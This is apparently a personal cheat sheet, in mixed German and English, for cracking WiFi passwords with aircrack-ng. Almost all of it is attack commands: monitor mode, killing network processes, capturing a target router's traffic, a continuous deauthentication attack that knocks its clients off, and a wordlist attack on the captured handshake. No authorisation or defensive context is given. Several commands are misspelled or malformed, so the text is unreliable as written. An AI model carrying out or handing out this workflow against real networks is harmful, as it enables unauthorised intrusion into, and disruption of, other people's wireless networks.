# aircrack-ng

```java
apt-get install aircrack-ng -y
```

## [[WiFi crack]]
```java
//Set wificard in monitor mode (monitor.sh)
Ifconfig                           --> take wlan card name
Ifconfig name down     //runterfahren
Ifconfig name mode monitor
Ifconfig name up
Iwconfig name | grep Mode

//Change MAC


//Check if prozess interfering! IF KILL
Airmon-ng check name
Kill 1312 (Networkmanager)
Kill 17917 (dhclient)
Kill 1556, 1215, 1216

//Netzwerk sniffen
Airodump-ng name
Airodumo -c [channel] -w [FILE] --bsssid [MAC]
Airplay-ng -0 0 -a [MAC]              //deauthenticate dauerhaft
Aircrack-ng -w [word list] capture.cap

//Change networkcard channel to Router channel
Aireplay-ng -0 0 -a [MAC] name            --> get channel + MAC(bssid)
Iwconfig name channel 6
```


```meta
requirements: 
results: 
opsec: 
oss: #linux
source: 
description: 
```